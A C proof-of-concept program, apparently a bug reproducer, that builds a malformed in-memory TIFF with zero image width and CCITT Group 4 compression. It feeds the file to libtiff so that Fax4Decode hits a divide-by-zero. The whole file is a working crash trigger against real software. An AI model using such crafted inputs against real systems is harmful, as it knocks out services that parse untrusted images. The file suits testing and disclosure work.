#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <tiffio.h>

/* Simple in-memory file backend for libtiff */
typedef struct {
    const uint8_t *data;
    toff_t size;
    toff_t off;
} MemFile;

static tmsize_t mem_read(thandle_t h, void *buf, tmsize_t size) {
    MemFile *m = (MemFile *)h;
    if (size <= 0) return 0;
    toff_t remain = (m->off < m->size) ? (m->size - m->off) : 0;
    tmsize_t n = (tmsize_t)((remain < (toff_t)size) ? remain : (toff_t)size);
    if (n > 0) {
        memcpy(buf, m->data + m->off, (size_t)n);
        m->off += n;
    }
    return n;
}

static tmsize_t mem_write(thandle_t h, void *buf, tmsize_t size) {
    (void)h; (void)buf; (void)size;
    return -1; /* read-only */
}

static toff_t mem_seek(thandle_t h, toff_t off, int whence) {
    MemFile *m = (MemFile *)h;
    toff_t newoff = m->off;
    if (whence == SEEK_SET) newoff = off;
    else if (whence == SEEK_CUR) newoff = m->off + off;
    else if (whence == SEEK_END) newoff = m->size + off;
    if (newoff < 0) return (toff_t)-1;
    m->off = newoff;
    return m->off;
}

static int mem_close(thandle_t h) {
    (void)h; return 0;
}

static toff_t mem_size(thandle_t h) {
    MemFile *m = (MemFile *)h;
    return m->size;
}

static int mem_map(thandle_t h, void **base, toff_t *size) {
    (void)h; (void)base; (void)size; return 0; /* no mmap */
}

static void mem_unmap(thandle_t h, void *base, toff_t size) {
    (void)h; (void)base; (void)size; /* no mmap */
}

/* Helpers to write little-endian values into a buffer */
static void put16le(uint8_t *b, size_t off, uint16_t v) {
    b[off+0] = (uint8_t)(v & 0xFF);
    b[off+1] = (uint8_t)((v >> 8) & 0xFF);
}
static void put32le(uint8_t *b, size_t off, uint32_t v) {
    b[off+0] = (uint8_t)(v & 0xFF);
    b[off+1] = (uint8_t)((v >> 8) & 0xFF);
    b[off+2] = (uint8_t)((v >> 16) & 0xFF);
    b[off+3] = (uint8_t)((v >> 24) & 0xFF);
}

static void write_ifd_entry(uint8_t *b, size_t *pos,
                            uint16_t tag, uint16_t type,
                            uint32_t count, uint32_t value_le) {
    put16le(b, *pos + 0, tag);
    put16le(b, *pos + 2, type);
    put32le(b, *pos + 4, count);
    /* value_le is assumed already little-endian numerical value */
    put32le(b, *pos + 8, value_le);
    *pos += 12;
}

int main(void) {
    /* Build a minimal TIFF with ImageWidth = 0 and CCITT Group 4 compression */
    uint8_t buf[256];
    memset(buf, 0, sizeof(buf));

    /* TIFF header: Little-endian */
    size_t pos = 0;
    buf[pos++] = 'I';
    buf[pos++] = 'I';
    buf[pos++] = 42;  /* version 42 -> 0x2A 0x00 */
    buf[pos++] = 0;
    /* Offset to first IFD = 8 */
    put32le(buf, pos, 8);
    pos += 4;

    /* Start of IFD at offset 8 */
    size_t ifd_off = 8;
    pos = ifd_off;
    const uint16_t nent = 9;
    put16le(buf, pos, nent);
    pos += 2;

    /* Keep track to patch StripOffsets value later */
    size_t strip_offsets_value_pos = 0;

    /* Entries: all single-value and fit in value field */
    /* ImageWidth (256), type LONG (4), count 1, value 0 */
    write_ifd_entry(buf, &pos, 256, 4, 1, 0);
    /* ImageLength (257), type LONG (4), count 1, value 1 */
    write_ifd_entry(buf, &pos, 257, 4, 1, 1);
    /* BitsPerSample (258), type SHORT (3), count 1, value 1 (packed into 4 bytes) */
    write_ifd_entry(buf, &pos, 258, 3, 1, 1);
    /* Compression (259), type SHORT (3), count 1, value 4 (CCITT Group 4) */
    write_ifd_entry(buf, &pos, 259, 3, 1, 4);
    /* PhotometricInterpretation (262), type SHORT (3), count 1, value 0 (MINISWHITE) */
    write_ifd_entry(buf, &pos, 262, 3, 1, 0);
    /* SamplesPerPixel (277), type SHORT (3), count 1, value 1 */
    write_ifd_entry(buf, &pos, 277, 3, 1, 1);
    /* RowsPerStrip (278), type LONG (4), count 1, value 1 */
    write_ifd_entry(buf, &pos, 278, 4, 1, 1);
    /* StripOffsets (273), type LONG (4), count 1, value to be patched */
    strip_offsets_value_pos = pos + 8; /* location of the 4-byte value */
    write_ifd_entry(buf, &pos, 273, 4, 1, 0xDEADBEEF);
    /* StripByteCounts (279), type LONG (4), count 1, value 0 bytes */
    write_ifd_entry(buf, &pos, 279, 4, 1, 0);

    /* Next IFD offset = 0 */
    put32le(buf, pos, 0);
    pos += 4;

    /* Place (empty) compressed data immediately after IFD. Put one padding byte. */
    uint32_t data_off = (uint32_t)pos;
    /* Patch StripOffsets value with data_off */
    put32le(buf, strip_offsets_value_pos, data_off);

    /* One dummy byte of data */
    buf[pos++] = 0x00;

    /* Final size */
    size_t file_size = pos;

    /* Prepare memory-backed TIFF */
    MemFile m;
    m.data = buf;
    m.size = (toff_t)file_size;
    m.off = 0;

    TIFF *tif = TIFFClientOpen("mem_zero_width_fax4.tif", "r",
                               (thandle_t)&m,
                               mem_read, mem_write, mem_seek, mem_close,
                               mem_size, mem_map, mem_unmap);
    if (!tif) {
        fprintf(stderr, "Failed to open in-memory TIFF via TIFFClientOpen\n");
        return 1;
    }

    /* Trigger decoding of a scanline. For ImageWidth=0, scanline size is 0. */
    uint8_t outbuf[1];
    /* This call will set up the CCITT Group 4 decoder and then call Fax4Decode
       with occ = 0. Fax4Decode does 'if (occ % sp->b.rowbytes)' where rowbytes
       is computed from ImageWidth. With ImageWidth==0, rowbytes==0, causing
       a divide-by-zero in the modulo expression. */
    (void)TIFFReadScanline(tif, outbuf, 0, 0);

    TIFFClose(tif);
    return 0;
}
